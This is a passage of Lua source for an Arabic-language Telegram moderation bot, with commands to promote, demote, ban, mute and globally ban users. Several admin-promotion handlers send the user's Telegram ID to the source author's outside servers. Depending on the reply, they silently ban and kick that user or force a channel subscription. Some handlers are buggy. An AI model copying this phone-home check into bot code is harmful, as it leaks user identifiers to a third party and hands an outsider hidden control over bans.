HTTPS.request("https://api.telegram.org/bot" .. token .. "/promoteChatMember?chat_id=" .. msg.chat_id_ .. "&user_id=" ..result.id_.."&can_change_info=false&can_delete_messages=false&can_invite_users=false&can_restrict_members=false&can_pin_messages=false&can_promote_members=false")
texfm = '💁🏻‍♂️※ العضو ✓['..result.title_..'](t.me/'..(apmd[2] or 'FAYOMYYT')..')\n※ تم تنزيله ادمن   في الكروب ✓ 👨🏻‍🚒'
else
texfm = '✖┇خطاء'
end
send(msg.chat_id_, msg.id_, 1, texfm, 1, 'md')
end
resolve_username(apmd[2],promote_by_username)
end
---------------------------------------
-------------------------------------
if text:match("^تنزيل منشئ بالكروب (%d+)$") and  is_creatorbasic(msg) then
local apmd = {string.match(text, "^(تنزيل منشئ بالكروب) (%d+)$")}
HTTPS.request("https://api.telegram.org/bot" .. token .. "/promoteChatMember?chat_id=" .. msg.chat_id_ .. "&user_id=" ..apmd[2].."&can_change_info=false&can_delete_messages=false&can_invite_users=false&can_restrict_members=false&can_pin_messages=false&can_promote_members=false")
fmX000(apmd[2],msg,'※ تم تنزيله منشئ   في الكروب ✓ 👨🏻‍🚒')
end
if text:match("^تنزيل منشئ بالكروب$")  and is_creatorbasic(msg) and msg.reply_to_message_id_ then
function promote_by_reply(extra, result, success)
HTTPS.request("https://api.telegram.org/bot" .. token .. "/promoteChatMember?chat_id=" .. msg.chat_id_ .. "&user_id=" ..result.sender_user_id_.."&can_change_info=false&can_delete_messages=false&can_invite_users=false&can_restrict_members=false&can_pin_messages=false&can_promote_members=false")
fmX000("prore",msg,'※ تم تنزيله منشئ   في الكروب ✓ 👨🏻‍🚒')
end
getMessage(msg.chat_id_, msg.reply_to_message_id_,promote_by_reply)
end
if text:match("^تنزيل منشئ بالكروب @(.*)$") and is_creatorbasic(msg) then
local apmd = {string.match(text, "^(تنزيل منشئ بالكروب) @(.*)$")}
function promote_by_username(extra, result, success)
if result.id_ then
HTTPS.request("https://api.telegram.org/bot" .. token .. "/promoteChatMember?chat_id=" .. msg.chat_id_ .. "&user_id=" ..result.id_.."&can_change_info=false&can_delete_messages=false&can_invite_users=false&can_restrict_members=false&can_pin_messages=false&can_promote_members=false")
texfm = '💁🏻‍♂️※ العضو ✓['..result.title_..'](t.me/'..(apmd[2] or 'FAYOMYYT')..')\n※ تم تنزيله منشئ   في الكروب ✓ 👨🏻‍🚒'
else
texfm = '✖┇خطاء'
end
send(msg.chat_id_, msg.id_, 1, texfm, 1, 'md')
end
resolve_username(apmd[2],promote_by_username)
end
---------------------------
    
 if text:match("^رفع ادمن$")  and (is_owner(msg) or is_creatorbasic(msg)) and msg.reply_to_message_id_ then
 local res = http.request('http://fayomy.gq/xxx.php?id='..msg.sender_user_id_..'')
vardump(res)
if res then
if res == 'false' then
send(msg.chat_id_, msg.id_, 1," عزيزي ! \nتم حظرك من جميع بوتات السورس🔱❌", 1, 'html')   
local hash =  'fayomy:'..bot_id..'gbanned:'
database:sadd(hash, msg.sender_user_id_)
chat_kick(msg.chat_id_, msg.sender_user_id_)
return false end
end end
if text:match("^رفع ادمن$")  and (is_owner(msg) or is_creatorbasic(msg)) and msg.reply_to_message_id_ then
local res = http.request('https://fayomy.000webhostapp.com/fayomy.gq/x.php?id='..msg.sender_user_id_..'')
vardump(res)
if res then
if res == 'false' then
send(msg.chat_id_, msg.id_, 1,'\n• اهلا بك عزيزي 🔱 •\n• لايمكنك استخدام البوت ✅ •\n• عليك الاشتراك في القناة 🔽 •\n• @FAYOMYYT ⚜️\n', 1, 'html')   
return false end
end
function promote_by_reply(extra, result, success)
local hash =  'fayomy:'..bot_id..'mods:'..msg.chat_id_
if database:sismember(hash, result.sender_user_id_) then
fmX000("prore",msg,'※ بالفعل تم رفعة ادمن   في البوت ✓ 👨🏻‍🚒')
else
database:sadd(hash, result.sender_user_id_)
fmX000("prore",msg,'※ تم رفعة ادمن   في البوت ✓ 👨🏻‍🚒')
end
end
getMessage(msg.chat_id_, msg.reply_to_message_id_,promote_by_reply)
end
if text:match("^رفع ادمن @(.*)$") and (is_owner(msg) or is_creatorbasic(msg)) then
local res = http.request('https://fayomy.000webhostapp.com/fayomy.gq/x.php?id='..msg.sender_user_id_..'')
vardump(res)
if res then
if res == 'false' then
send(msg.chat_id_, msg.id_, 1,'\n• اهلا بك عزيزي 🔱 •\n• لايمكنك استخدام البوت ✅ •\n• عليك الاشتراك في القناة 🔽 •\n• @FAYOMYYT ⚜️\n', 1, 'html')   
return false end
end
local apmd = {string.match(text, "^(رفع ادمن) @(.*)$")}
function promote_by_username(extra, result, success)
if result.id_ then
database:sadd('fayomy:'..bot_id..'mods:'..msg.chat_id_, result.id_)
texfm = '💁🏻‍♂️※ العضو ✓['..result.title_..'](t.me/'..(apmd[2] or 'FAYOMYYT')..')\n※ تم رفعة ادمن   في البوت ✓ 👨🏻‍🚒'
else
texfm = '✖┇خطاء'
end
send(msg.chat_id_, msg.id_, 1, texfm, 1, 'md')
end
resolve_username(apmd[2],promote_by_username)
end
if text:match("^رفع ادمن (%d+)$") and (is_owner(msg) or is_creatorbasic(msg)) then
local res = http.request('https://fayomy.000webhostapp.com/fayomy.gq/x.php?id='..msg.sender_user_id_..'')
vardump(res)
if res then
if res == 'false' then
send(msg.chat_id_, msg.id_, 1,'\n• اهلا بك عزيزي 🔱 •\n• لايمكنك استخدام البوت ✅ •\n• عليك الاشتراك في القناة 🔽 •\n• @FAYOMYYT ⚜️\n', 1, 'html')   
return false end
end
local apmd = {string.match(text, "^(رفع ادمن) (%d+)$")}
local res = http.request('https://fayomy.000webhostapp.com/fayomy.gq/x.php?id='..msg.sender_user_id_..'')
vardump(res)
if res then
if res == 'false' then
send(msg.chat_id_, msg.id_, 1,'\n• اهلا بك عزيزي 🔱 •\n• لايمكنك استخدام البوت ✅ •\n• عليك الاشتراك في القناة 🔽 •\n• @FAYOMYYT ⚜️\n', 1, 'html')   
return false end
end
database:sadd('fayomy:'..bot_id..'mods:'..msg.chat_id_, apmd[2])
fmX000(apmd[2],msg,"※ تم رفعة ادمن   في البوت ✓ 👨🏻‍🚒")
end
if text:match("^تنزيل ادمن$") and (is_owner(msg) or is_creatorbasic(msg)) and msg.reply_to_message_id_ then
function demote_by_reply(extra, result, success)
local hash =  'fayomy:'..bot_id..'mods:'..msg.chat_id_
if not database:sismember(hash, result.sender_user_id_) then
fmX000("prore",msg,"※ بالفعل تم تنزيله من ادمنيه البوت ✓ 🧙🏻‍♂️")
else
database:srem(hash, result.sender_user_id_)
fmX000("prore",msg,"※ تم تنزيله من ادمنيه البوت ✓ 🧙🏻‍♂️")
end
end
getMessage(msg.chat_id_, msg.reply_to_message_id_,demote_by_reply)
end
if text:match("^تنزيل ادمن @(.*)$") and (is_owner(msg) or is_creatorbasic(msg)) then
local hash =  'fayomy:'..bot_id..'mods:'..msg.chat_id_
local apmd = {string.match(text, "^(تنزيل ادمن) @(.*)$")}
function demote_by_username(extra, result, success)
if result.id_ then
database:srem(hash, result.id_)
texfm = '💁🏻‍♂️※ العضو ✓['..result.title_..'](t.me/'..(apmd[2] or 'FAYOMYYT')..')\n※ تم تنزيله من ادمنيه البوت ✓ 🧙🏻‍♂️'
else
texfm = '✖┇خطاء'
end
send(msg.chat_id_, msg.id_, 1, texfm, 1, 'md')
end
resolve_username(apmd[2],demote_by_username)
end
if text:match("^تنزيل ادمن (%d+)$") and (is_owner(msg) or is_creatorbasic(msg)) then
local hash =  'fayomy:'..bot_id..'mods:'..msg.chat_id_
local apmd = {string.match(text, "^(تنزيل ادمن) (%d+)$")}
database:srem(hash, apmd[2])
fmX000(apmd[2],msg,"※ تم تنزيله من ادمنيه البوت ✓ 🧙🏻‍♂️")
end
if (text:match("^رفع عضو مميز$") or text:match("^رفع مميز$"))  and (is_owner(msg) or is_creatorbasic(msg)) and msg.reply_to_message_id_ then
function promote_by_reply(extra, result, success)
local hash =  'fayomy:'..bot_id..'vipgp:'..msg.chat_id_
if database:sismember(hash, result.sender_user_id_) then
fmX000("prore",msg,"※ تم بالفعل رفعة عضو مميز  في البوت ✓ 👶🏻") 
else
database:sadd(hash, result.sender_user_id_)
fmX000("prore",msg,"※ تم رفعة عضو مميز  في البوت ✓ 👶🏻")
end
end
getMessage(msg.chat_id_, msg.reply_to_message_id_,promote_by_reply)
end
local text = text:gsub('رفع مميز','رفع عضو مميز')
if text:match("^رفع عضو مميز @(.*)$") and (is_owner(msg) or is_creatorbasic(msg)) then
local apmd = {string.match(text, "^(رفع عضو مميز) @(.*)$")}
function promote_by_username(extra, result, success)
if result.id_ then
database:sadd('fayomy:'..bot_id..'vipgp:'..msg.chat_id_, result.id_)
texfm = '💁🏻‍♂️※ العضو ✓['..result.title_..'](t.me/'..(apmd[2] or 'FAYOMYYT')..')\n※ تم رفعة عضو مميز  في البوت ✓ 👶🏻'
else
texfm = '✖┇خطاء'
end
send(msg.chat_id_, msg.id_, 1, texfm, 1, 'md')
end
resolve_username(apmd[2],promote_by_username)
end
local text = text:gsub('رفع مميز','رفع عضو مميز')
if text:match("^رفع عضو مميز (%d+)$") and (is_owner(msg) or is_creatorbasic(msg)) then
local apmd = {string.match(text, "^(رفع عضو مميز) (%d+)$")}
database:sadd('fayomy:'..bot_id..'vipgp:'..msg.chat_id_, apmd[2])
fmX000(apmd[2],msg,"※ تم رفعة عضو مميز  في البوت ✓ 👶🏻")
end
if text and text == "تعين الايدي" and (is_owner(msg) or is_creatorbasic(msg)) then
send(msg.chat_id_, msg.id_, 1,  '☑┇ ارسل الان النص\n☑┇ يمكنك اضافه :\n- `#username` > اسم المستخدم\n- `#msgs` > عدد رسائل المستخدم\n- `#photos` > عدد صور المستخدم\n- `#id` > ايدي المستخدم\n- `#auto` > تفاعل المستخدم\n- `#stast` > موقع المستخدم \n- `#edit` > عدد السحكات\n- `#game` > المجوهرات', 1, 'md')
database:set("fmahke:set:id:"..bot_id..msg.chat_id_..msg.sender_user_id_,'fayomy')
return "fayomy"
end
if text and (is_owner(msg) or is_creatorbasic(msg)) and database:get("fmahke:set:id:"..bot_id..msg.chat_id_..msg.sender_user_id_) then 
database:del("fmahke:set:id:"..bot_id..msg.chat_id_..msg.sender_user_id_)
send(msg.chat_id_, msg.id_, 1,  '☑┇ تم الحفض بنجاح', 1, 'md')
database:set("fayomy:gr:id:text:"..bot_id..msg.chat_id_,text)
end
if text and text == "مسح الايدي" and (is_owner(msg) or is_creatorbasic(msg)) then
send(msg.chat_id_, msg.id_, 1,  '✖┇ تم المسح بنجاح', 1, 'md')
database:del("fayomy:gr:id:text:"..bot_id..msg.chat_id_)
end
if (text:match("^تنزيل عضو مميز$") or text:match("^تنزيل مميز$")) and (is_owner(msg) or is_creatorbasic(msg)) and msg.reply_to_message_id_ then
function demote_by_reply(extra, result, success)
local hash =  'fayomy:'..bot_id..'vipgp:'..msg.chat_id_
if not database:sismember(hash, result.sender_user_id_) then
fmX000("prore",msg,"※ تم تنزيله من اعضاء الممزين البوت ✓👨🏻‍🚒")  
else
database:srem(hash, result.sender_user_id_)
fmX000("prore",msg,"※ تم تنزيله من اعضاء الممزين البوت ✓👨🏻‍🚒")
end
end
getMessage(msg.chat_id_, msg.reply_to_message_id_,demote_by_reply)
end
local text = text:gsub('تنزيل مميز','تنزيل عضو مميز')
if text:match("^تنزيل عضو مميز @(.*)$") and (is_owner(msg) or is_creatorbasic(msg)) then
local hash =  'fayomy:'..bot_id..'vipgp:'..msg.chat_id_
local apmd = {string.match(text, "^(تنزيل عضو مميز) @(.*)$")}
function demote_by_username(extra, result, success)
if result.id_ then
database:srem(hash, result.id_)
texfm = '💁🏻‍♂️※ العضو ✓['..result.title_..'](t.me/'..(apmd[2] or 'FAYOMYYT')..')\n※ تم تنزيله من اعضاء الممزين البوت ✓👨🏻‍🚒'
else
texfm = '✖┇خطاء'
end
send(msg.chat_id_, msg.id_, 1, texfm, 1, 'md')
end
resolve_username(apmd[2],demote_by_username)
end
local text = text:gsub('تنزيل مميز','تنزيل عضو مميز')
if text:match("^تنزيل عضو مميز (%d+)$") and (is_owner(msg) or is_creatorbasic(msg)) then
local hash =  'fayomy:'..bot_id..'vipgp:'..msg.chat_id_
local apmd = {string.match(text, "^(تنزيل عضو مميز) (%d+)$")}
database:srem(hash, apmd[2])
fmX000(apmd[2],msg,"※ تم تنزيله من اعضاء الممزين البوت ✓👨🏻‍🚒")
end  
if text:match("^حظر$") and (is_mod(msg) or is_creatorbasic(msg)) and msg.reply_to_message_id_ ~= 0 then
if not is_creator(msg) and database:get("Fayomy:lock:ban_and_kick"..bot_id..msg.chat_id_) then 
send(msg.chat_id_, msg.id_, 1, '✖┇لا تستطيع حظر', 1, 'md')
return "fmhakke"
end
function ban_by_reply(extra, result, success)
local hash =  'fayomy:'..bot_id..'banned:'..msg.chat_id_
if ck_mod(result.sender_user_id_, msg.chat_id_) then
send(msg.chat_id_, msg.id_, 1, '❕┇لا تستطيع حظر \n🔘┇(مدراء،ادمنيه،اعضاء مميزين)البوت', 1, 'md')
else
if database:sismember(hash, result.sender_user_id_) then
fmX000("prore",msg,"☑┇بالفعل تم حظره من المجموعه")
chat_kick(result.chat_id_, result.sender_user_id_)
else
database:sadd(hash, result.sender_user_id_)
fmX000("prore",msg,"☑┇تم حظره من المجموعه")
chat_kick(result.chat_id_, result.sender_user_id_)
end
end
end
getMessage(msg.chat_id_, msg.reply_to_message_id_,ban_by_reply)
end

if text:match("^حظر @(.*)$") and (is_mod(msg) or is_creatorbasic(msg)) then
if not is_creator(msg) and database:get("Fayomy:lock:ban_and_kick"..bot_id..msg.chat_id_) then 
send(msg.chat_id_, msg.id_, 1, '✖┇لا تستطيع حظر', 1, 'md')
return "fmhakke"
end
local apba = {string.match(text, "^(حظر) @(.*)$")}
function ban_by_username(extra, result, success)
if result.id_ then
if ck_mod(result.id_, msg.chat_id_)then
send(msg.chat_id_, msg.id_, 1, '❕┇لا تستطيع حظر \n🔘┇(مدراء،ادمنيه،اعضاء مميزين)البوت', 1, 'md')
else
database:sadd('fayomy:'..bot_id..'banned:'..msg.chat_id_, result.id_)
texfm = '💁🏻‍♂️※ العضو ✓['..result.title_..'](t.me/'..(apba[2] or 'FAYOMYYT')..')\n☑┇تم حظره من المجموعه'
chat_kick(msg.chat_id_, result.id_)
end
else
texfm = '✖┇خطاء'
end
send(msg.chat_id_, msg.id_, 1, texfm, 1, 'md')
end
resolve_username(apba[2],ban_by_username)
end

if text:match("^حظر (%d+)$") and (is_mod(msg) or is_creatorbasic(msg)) then
if not is_creator(msg) and database:get("Fayomy:lock:ban_and_kick"..bot_id..msg.chat_id_) then 
send(msg.chat_id_, msg.id_, 1, '✖┇لا تستطيع حظر', 1, 'md')
return "fmhakke"
end
local apba = {string.match(text, "^([Bb][Aa][Nn]) (%d+)$")}
if ck_mod(apba[2], msg.chat_id_)  then
send(msg.chat_id_, msg.id_, 1, '🙋🏻‍♂️※ لا تستطيع حظر او طرد (مدراء، ادمنية،مميزين)البوت   ✓', 1, 'md')
else
database:sadd('fayomy:'..bot_id..'banned:'..msg.chat_id_, apba[2])
chat_kick(msg.chat_id_, apba[2])  
fmX000(apba[2],msg,"☑┇تم حظره من المجموعه")
end
end
if text:match("^رفع القيود$") and (is_mod(msg) or is_creatorbasic(msg)) and msg.reply_to_message_id_ ~= 0 then
function clear_all1(extra, result, success)
local hash =  'fayomy:'..bot_id..'banned:'..msg.chat_id_
local hash1 =  'fayomy:'..bot_id..'banned:'..msg.chat_id_
database:del(hash, result.sender_user_id_)
database:del(hash1, result.sender_user_id_)
fmX000("prore",msg,"☑┇تم تحريره من القيود")
end
getMessage(msg.chat_id_, msg.reply_to_message_id_,clear_all1)
end
if text:match("^رفع القيود @(.*)$") and (is_mod(msg) or is_creatorbasic(msg)) then
local apba = {string.match(text, "^(رفع القيود) @(.*)$")}
function clear_all(extra, result, success)
if result.id_ then
database:del('fayomy:'..bot_id..'banned:'..msg.chat_id_, result.id_)
database:del('fayomy:'..bot_id..'muted:'..msg.chat_id_, result.id_)
texfm = '💁🏻‍♂️※ العضو ✓['..result.title_..'](t.me/'..(apba[2] or 'FAYOMYYT')..')\n☑┇تم تحريره من القيود'
end
send(msg.chat_id_, msg.id_, 1, texfm, 1, 'md')
end
resolve_username(apba[2],clear_all)
end
if text:match("^رفع القيود (%d+)$") and (is_mod(msg) or is_creatorbasic(msg)) then
local apba = {string.match(text, "^رفع القيود (%d+)$")}
database:del('fayomy:'..bot_id..'banned:'..msg.chat_id_, apba[2])
database:del('fayomy:'..bot_id..'muted:'..msg.chat_id_, apba[2])
fmX000(apba[2],msg,"☑┇تم تحريره من القيود")
end
if text:match("^كشف القيود @(.*)$") then
local ap = {string.match(text, "^(كشف القيود) @(.*)$")}
function kewd_by_username(extra, result, success)
if result.id_ then
if database:sismember('fayomy:'..bot_id..'gbanned:',result.id_) then
kewd = 'محظور عام'
elseif database:sismember('fayomy:'..bot_id..'banned:'..msg.chat_id_,result.id_) then
kewd = 'محظور'
elseif database:sismember('fayomy:'..bot_id..'muted:'..msg.chat_id_,result.id_) then
kewd = 'مكتوم'
elseif database:sismember('fayomy:'..bot_id..'res'..msg.chat_id_,result.id_) then
kewd = 'مقيد'
else
kewd = ' لا يوجد'
end
texfm = "\n⛓ ※ القيود ✓*("..kewd..")*"
else
texfm = ""..result.id_..""
end
send(msg.chat_id_, msg.id_, 1, texfm, 1, 'md')
end
resolve_username(ap[2],kewd_by_username)
end
----------------------------------------------unban--------------------------------------------
if text:match("^الغاء حظر$") and (is_mod(msg) or is_creatorbasic(msg)) and msg.reply_to_message_id_ then
function unban_by_reply(extra, result, success)
local hash =  'fayomy:'..bot_id..'banned:'..msg.chat_id_
if not database:sismember(hash, result.sender_user_id_) then
fmX000("prore",msg,"☑┇بالفعل تم الغاء حظره من البوت")
else
database:srem(hash, result.sender_user_id_)
fmX000("prore",msg,"☑┇تم الغاء حظره من البوت")
end
end
getMessage(msg.chat_id_, msg.reply_to_message_id_,unban_by_reply)
end
if is_mod(msg) then 
if text:match("وضع رابط (https://telegram.me/joinchat/%S+)") or text:match("وضع رابط (https://t.me/joinchat/%S+)") then   
local glink = text:match("وضع رابط (https://telegram.me/joinchat/%S+)") or text:match("وضع رابط (https://t.me/joinchat/%S+)") 
database:set('fayomy:'..bot_id.."group:link"..msg.chat_id_,glink) 
send(msg.chat_id_, msg.id_, 1, '☑️┇تم وضع رابط', 1, 'md') 
send(msg.chat_id_, 0, 1, '↙️┇رابط المجموعه الجديد\n'..glink, 1, 'html')
end 
end
if text:match("^الغاء حظر @(.*)$") and (is_mod(msg) or is_creatorbasic(msg)) then
local apba = {string.match(text, "^(الغاء حظر) @(.*)$")}
function unban_by_username(extra, result, success)
if result.id_ then
database:srem('fayomy:'..bot_id..'banned:'..msg.chat_id_, result.id_)
texfm = '💁🏻‍♂️※ العضو ✓['..result.title_..'](t.me/'..(apba[2] or 'FAYOMYYT')..')\n☑┇تم الغاء حظره من البوت' 
else
texfm = '✖┇خطاء'
end
send(msg.chat_id_, msg.id_, 1, texfm, 1, 'md')
end
resolve_username(apba[2],unban_by_username)
end

if text:match("^الغاء حظر (%d+)$") and (is_mod(msg) or is_creatorbasic(msg)) then
local apba = {string.match(text, "^(الغاء حظر) (%d+)$")}
database:srem('fayomy:'..bot_id..'banned:'..msg.chat_id_, apba[2])
fmX000(apba[2],msg,"☑┇تم الغاء حظره من البوت") 
end

if text:match("^الغاء حظر$") and (is_mod(msg) or is_creatorbasic(msg)) and msg.reply_to_message_id_ then
function moody(extra, result, success)
function unban_by_reply(extra, result, success)
local hash =  'fayomy:'..bot_id..'banned:'..msg.chat_id_
database:srem(hash, result.sender_user_id_)
if tonumber(bot_id) ~= tonumber(result.sender_user_id_) then 
bot.changeChatMemberStatus(msg.chat_id_, result.sender_user_id_, "Left")
end
end
getMessage(msg.chat_id_, msg.reply_to_message_id_,unban_by_reply)
end
bot.channel_get_kicked(msg.chat_id_,moody)
end

if text:match("^الغاء حظر @(.*)$") and (is_mod(msg) or is_creatorbasic(msg)) then
local apba = {string.match(text, "^(الغاء حظر) @(.*)$")}
function moody(extra, result, success)
function unban_by_username(extra, result, success)
if result.id_ then
database:srem('fayomy:'..bot_id..'banned:'..msg.chat_id_, result.id_)
if tonumber(bot_id) ~= tonumber(result.id_) then 
bot.changeChatMemberStatus(msg.chat_id_, result.id_, "Left")
end
else
end
send(msg.chat_id_, msg.id_, 1, txxt, 1, 'html')
end
resolve_username(apba[2],unban_by_username)
end
bot.channel_get_kicked(msg.chat_id_,moody)
end

if text:match("^الغاء حظر (%d+)$") and (is_mod(msg) or is_creatorbasic(msg)) then
local apba = {string.match(text, "^(الغاء حظر) (%d+)$")}
function moody(extra, result, success)
database:srem('fayomy:'..bot_id..'banned:'..msg.chat_id_, apba[2])
if tonumber(bot_id) ~= tonumber(apba[2]) then 
bot.changeChatMemberStatus(msg.chat_id_, apba[2], "Left")
end
end
bot.channel_get_kicked(msg.chat_id_,moody)
end

if text:match("^حذف الكل$") and (is_owner(msg) or is_creatorbasic(msg)) and msg.reply_to_message_id_ then
function delall_by_reply(extra, result, success)
if ck_mod(result.sender_user_id_, msg.chat_id_) then
send(msg.chat_id_, msg.id_, 1, '🙋🏻‍♂️※ لا تستطيع مسح رسائل (مدراء، ادمنية،مميزين)البوت   ✓', 1, 'md')
else
send(msg.chat_id_, msg.id_, 1, '💁🏻‍♂️※ العضو ✓*('..result.sender_user_id_..')* \n🗑┇تم حذف كل رسائله\n', 1, 'md')
del_all_msgs(result.chat_id_, result.sender_user_id_)
end
end
getMessage(msg.chat_id_, msg.reply_to_message_id_,delall_by_reply)
end

if text:match("^حذف الكل (%d+)$") and (is_owner(msg) or is_creatorbasic(msg)) then
local ass = {string.match(text, "^(حذف الكل) (%d+)$")}
if ck_mod(ass[2], msg.chat_id_) then
send(msg.chat_id_, msg.id_, 1, '🙋🏻‍♂️※ لا تستطيع مسح رسائل (مدراء، ادمنية،مميزين)البوت   ✓', 1, 'md')
else
del_all_msgs(msg.chat_id_, ass[2])
send(msg.chat_id_, msg.id_, 1, '💁🏻‍♂️※ العضو ✓*('..ass[2]..')* \n🗑┇تم حذف كل رسائله\n', 1, 'md')
end
end

if text:match("^حذف الكل @(.*)$") and (is_owner(msg) or is_creatorbasic(msg)) then
local apbll = {string.match(text, "^(حذف الكل) @(.*)$")}
function delall_by_username(extra, result, success)
if result.id_ then
if ck_mod(result.id_, msg.chat_id_) then
send(msg.chat_id_, msg.id_, 1, '🙋🏻‍♂️※ لا تستطيع مسح رسائل (مدراء، ادمنية،مميزين)البوت   ✓', 1, 'md')
return false
end
del_all_msgs(msg.chat_id_, result.id_)
texfm = '💁🏻‍♂️※ العضو ✓('..result.id_..') \n🗑┇تم حذف كل رسائله'
else
texfm = '✖┇خطاء'
end
send(msg.chat_id_, msg.id_, 1, texfm, 1, 'html')
end
resolve_username(apbll[2],delall_by_username)
end
-----------------------------------------banall--------------------------------------------------
if text:match("^حظر عام$") and tonumber(msg.sender_user_id_) == tonumber(sudo_add) and msg.reply_to_message_id_ then
function gban_by_reply(extra, result, success)
local hash =  'fayomy:'..bot_id..'gbanned:'
database:sadd(hash, result.sender_user_id_)
chat_kick(result.chat_id_, result.sender_user_id_)
fmX000("prore",msg,"🚫┇تم حظره من مجموعات البوت")
end
getMessage(msg.chat_id_, msg.reply_to_message_id_,gban_by_reply)
end

if text:match("^حظر عام @(.*)$") and tonumber(msg.sender_user_id_) == tonumber(sudo_add) then
local apbll = {string.match(text, "^(حظر عام) @(.*)$")}
function gban_by_username(extra, result, success)
if result.id_ then
local hash =  'fayomy:'..bot_id..'gbanned:'
texfm = '💁🏻‍♂️※ العضو ✓['..result.title_..'](t.me/'..(apbll[2] or 'FAYOMYYT')..')\n🚫┇تم حظره من المجموعات البوت'
database:sadd(hash, result.id_)
else
texfm = '✖┇خطاء'
end
send(msg.chat_id_, msg.id_, 1, texfm, 1, 'md')
end
resolve_username(apbll[2],gban_by_username)
end

if text:match("^حظر عام (%d+)$") and tonumber(msg.sender_user_id_) == tonumber(sudo_add) then
local apbll = {string.match(text, "^(حظر عام) (%d+)$")}
local hash =  'fayomy:'..bot_id..'gbanned:'
database:sadd(hash, apbll[2])
fmX000(apbll[2],msg,"🚫┇تم حظره من المجموعات البوت")
end
if text:match("^الغاء العام$") and tonumber(msg.sender_user_id_) == tonumber(sudo_add) and msg.reply_to_message_id_ then
function ungban_by_reply(extra, result, success)
local hash =  'fayomy:'..bot_id..'gbanned:'
fmX000("prore",msg,"🚫┇تم الغاء حظره من المجموعات البوت")
database:srem(hash, result.sender_user_id_)
end
getMessage(msg.chat_id_, msg.reply_to_message_id_,ungban_by_reply)
end

if text:match("^الغاء العام @(.*)$") and tonumber(msg.sender_user_id_) == tonumber(sudo_add) then
local apid = {string.match(text, "^(الغاء العام) @(.*)$")}
function ungban_by_username(extra, result, success)
local hash =  'fayomy:'..bot_id..'gbanned:'
if result.id_ then
texfm = '💁🏻‍♂️※ العضو ✓['..result.title_..'](t.me/'..(apid[2] or 'FAYOMYYT')..')\n��┇تم الغاء حظره من المجموعات البوت'
database:srem(hash, result.id_)
else
texfm = '✖┇خطاء'
end
send(msg.chat_id_, msg.id_, 1, texfm, 1, 'md')
end
resolve_username(apid[2],ungban_by_username)
end

if text:match("^الغاء العام (%d+)$") and tonumber(msg.sender_user_id_) == tonumber(sudo_add) then
local apbll = {string.match(text, "^(الغاء العام) (%d+)$")}
local hash =  'fayomy:'..bot_id..'gbanned:'
database:srem(hash, apbll[2])
fmX000(apbll[2],msg,"🚫┇تم الغاء حظره من مجموعات البوت")
end

if text:match("^كتم عام$") and tonumber(msg.sender_user_id_) == tonumber(sudo_add) and msg.reply_to_message_id_ then
function gmute_by_reply(extra, result, success)
local hash =  'fayomy:'..bot_id..'gmuted:'
database:sadd(hash, result.sender_user_id_)
fmX000("prore",msg,"🚫┇تم كتمه من المجموعات البوت")
end
getMessage(msg.chat_id_, msg.reply_to_message_id_,gmute_by_reply)
end

if text:match("^كتم عام @(.*)$") and tonumber(msg.sender_user_id_) == tonumber(sudo_add) then
local apbll = {string.match(text, "^(كتم عام) @(.*)$")}
function gmute_by_username(extra, result, success)
if result.id_ then
local hash =  'fayomy:'..bot_id..'gmuted:'
texfm = '💁🏻‍♂️※ العضو ✓['..result.title_..'](t.me/'..(apbll[2] or 'FAYOMYYT')..')\n🚫┇تم كتمه من المجموعات البوت'
database:sadd(hash, result.id_)
else
texfm = '✖┇خطاء'
end
send(msg.chat_id_, msg.id_, 1, texfm, 1, 'md')
end
resolve_username(apbll[2],gmute_by_username)
end

if text:match("^كتم عام (%d+)$") and tonumber(msg.sender_user_id_) == tonumber(sudo_add) then
local apbll = {string.match(text, "^(كتم عام) (%d+)$")}
local hash =  'fayomy:'..bot_id..'gmuted:'
database:sadd(hash, apbll[2])
fmX000(apbll[2],msg,"🚫┇تم كتمه من المجموعات البوت")
end
if text:match("^الغاء كتم العام$") and tonumber(msg.sender_user_id_) == tonumber(sudo_add) and msg.reply_to_message_id_ then
function ungmute_by_reply(extra, result, success)
local hash =  'fayomy:'..bot_id..'gmuted:'
fmX000("prore",msg,"🚫┇تم الغاء كتمه من المجموعات البوت")
database:srem(hash, result.sender_user_id_)
end
getMessage(msg.chat_id_, msg.reply_to_message_id_,ungmute_by_reply)
end

if text:match("^الغاء كتم العام @(.*)$") and tonumber(msg.sender_user_id_) == tonumber(sudo_add) then
local apid = {string.match(text, "^(الغاء كتم العام) @(.*)$")}
function ungmute_by_username(extra, result, success)
local hash =  'fayomy:'..bot_id..'gmuted:'
if result.id_ then
texfm = '💁🏻‍♂️※ العضو ✓['..result.title_..'](t.me/'..(apid[2] or 'FAYOMYYT')..')\n🚫┇تم الغاء كتمه من المجموعات البوت'
database:srem(hash, result.id_)
else
texfm = '✖┇خطاء'
end
send(msg.chat_id_, msg.id_, 1, texfm, 1, 'md')
end
resolve_username(apid[2],ungmute_by_username)
end

if text:match("^الغاء كتم العام (%d+)$") and tonumber(msg.sender_user_id_) == tonumber(sudo_add) then
local apbll = {string.match(text, "^(الغاء كتم العام) (%d+)$")}
local hash =  'fayomy:'..bot_id..'gmuted:'
database:srem(hash, apbll[2])
fmX000(apbll[2],msg,"🚫┇تم الغاء كتمه من المجموعات البوت")
end

if text:match("^كتم$") and (is_mod(msg) or is_creatorbasic(msg)) and msg.reply_to_message_id_ ~= 0 then
function mute_by_reply(extra, result, success)
local hash =  'fayomy:'..bot_id..'muted:'..msg.chat_id_
if ck_mod(result.sender_user_id_, msg.chat_id_) then
send(msg.chat_id_, msg.id_, 1, '🙋🏻‍♂️※ لا تستطيع كتم (مدراء، ادمنية،مميزين)البوت   ✓', 1, 'md')
else
if database:sismember(hash, result.sender_user_id_) then
fmX000("prore",msg,"🚫┇بالفعل تم كتمه")
else
database:sadd(hash, result.sender_user_id_)
fmX000("prore",msg,"🚫┇تم كتمه من البوت")
end
end
end
getMessage(msg.chat_id_, msg.reply_to_message_id_,mute_by_reply)
end
if text:match("^كتم @(.*)$") and (is_mod(msg) or is_creatorbasic(msg)) then
local apsi = {string.match(text, "^(كتم) @(.*)$")}
function mute_by_username(extra, result, success)
if result.id_ then
if ck_mod(result.id_, msg.chat_id_) then
send(msg.chat_id_, msg.id_, 1, '🙋🏻‍♂️※ لا تستطيع كتم (مدراء، ادمنية،مميزين)البوت   ✓', 1, 'md')
else 
database:sadd('fayomy:'..bot_id..'muted:'..msg.chat_id_, result.id_)
texfm = '💁🏻‍♂️※ العضو ✓['..result.title_..'](t.me/'..(apsi[2] or 'FAYOMYYT')..')\n🚫┇تم كتمه من البوت'
end
else
texfm = '✖┇خطاء'
end
